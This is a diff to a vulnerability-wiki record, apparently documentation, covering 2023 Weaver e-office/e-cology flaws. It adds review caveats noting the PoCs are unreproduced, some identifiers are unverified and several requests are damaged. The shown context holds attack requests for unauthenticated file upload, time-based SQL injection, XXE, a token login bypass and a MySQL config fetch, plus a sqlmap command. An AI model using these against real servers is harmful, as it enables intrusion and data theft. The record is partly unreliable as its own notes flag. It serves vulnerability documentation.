@@ -1,10 +1,54 @@
 ---
-cve: "CVE-2023-2523"
+title: "泛微e-office/e-cology 2023多漏洞合集"
+product: "泛微e-office/e-cology"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: "CVE-2023-2523;CVE-2023-2648;QVD-2023-16177;CNVD-2023-12632;QVD-2023-9849"
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "不同子条目9.5、8/9及10.56/10.57/10.58/10.58.2补丁，不能统一version"
+prerequisites: "各条声称前台/未认证"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+identifier_role: "primary"
+identifier_note: "来源编号存在未核实/冲突，未作为确认主编号：CVE-2023-15672"
+source: "原收录资料；原始作者及出处待核实"
+source_url: "https://mp.weixin.qq.com/s/QQ-0KEQR69UwwRtPLkDGzw"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/2023%20%E6%B3%9B%E5%BE%AE%20OA%20%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%EF%BC%88%E9%99%84%20POC%EF%BC%89.md"
+id: "vw-ed9872f3aa0b9646ad252aa3"
+entity_id: "ve-ed9872f3aa0b9646ad252aa3"
+schema_version: "1"
 ---
 
-# 2023 泛微 OA 漏洞合集（附 POC）
+# 泛微e-office/e-cology 2023多漏洞合集
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：泛微e-office/e-cology；2023多漏洞合集
+- 版本、配置及部署条件：不同子条目9.5、8/9及10.56/10.57/10.58/10.58.2补丁，不能统一version
+- 认证与权限前提：各条声称前台/未认证
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+- 编号待核：CVE-2023-15672。未核实的编号不作为本条确认主编号。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- FileDownloadForOutDoc的CVE-2023-15672标识需与官方源核对，不能凭此合集写入主库
+- 多个multipart name/filename丢失、边界不匹配、缺头体空行；tamper返回resul未定义
+- XXE EXP1仅空头，其他实体未声明完整；CheckServer只访问接口不能证明注入
+- ofsLogin查询出现×tamp转码损坏；修复范围及文章列表序号紊乱
+- 与多篇专项可做导航合集但逐接口独立对照，不整体按一个CVE合并
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QQ-0KEQR69UwwRtPLkDGzw)
 
 最近整理了 2023 年泛微 OA 存在的相关漏洞（附 POC）  
@@ -84,7 +128,7 @@ Content-Type:application/octet-stream
 
 **POC**：
 
-```
+```http
 POST /inc/jquery/uploadify/uploadify.php  HTTP/1.1
 Host:***
 Cache-Control: max-age=0
@@ -118,7 +162,7 @@ Content-Type: image/jpeg
 
 **POC**：  
 
-```
+```http
 GET /weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1 HTTP/1.1
 Host:***
 Accept:*/*
@@ -167,7 +211,7 @@ python3 sqlmap.py -r post.txt --tamper=ecology_sql_random.py --batch --dbs
 
 **POC**：  
 
-```
+```http
 POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
 Host:***
 Content-Type: application/xml
@@ -177,7 +221,7 @@ Content-Type: application/xml
 
 **EXP1**:  
 
-```
+```http
 POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
 Host:****
 Content-Type: application/xml
@@ -186,7 +230,7 @@ Content-Type: application/xml
 
 **EXP2**：  
 
-```
+```http
 POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
 Host:***
 Content-Type: application/xml
@@ -219,7 +263,7 @@ https://www.weaver.com.cn/cs/securityDownload.html#
 
 **POC**：  
 
-```
+```http
 POST /mobile/plugin/browser.jsp HTTP/1.1
 Host:***
 Upgrade-Insecure-Requests: 1
@@ -257,7 +301,7 @@ https://www.weaver.com.cn/cs/securityDownload.asp#
 
 **POC**：  
 
-```
+```http
 POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
 Host:***
 Content-Type: application/x-www-form-urlencoded
@@ -282,7 +326,7 @@ formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%
 **POC**：  
 
 ```
-/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1×tamp
+/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp
 
 ```
 
@@ -307,7 +351,7 @@ https://www.weaver.com.cn/cs/securityDownload.asp#
 
 **POC**：  
 
-```
+```http
 GET /mobile/plugin/CheckServer.jsp?type=mobileSetting HTTP/1.1
 Host: ***
 Connection: close
@@ -337,7 +381,7 @@ Weaver E-Office 是中国泛微科技（Weaver）公司的一个协同办公系�
 
 **POC**：  
 
-```
+```http
 GET /UserSelect/ HTTP/1.1
 Content-Type: application/josn
 
@@ -364,7 +408,7 @@ https://service.e-office.cn/download
 
 **POC**：
 
-```
+```http
 GET /mysql_config.ini HTTP/1.1
 Content-Type: application/josn
 
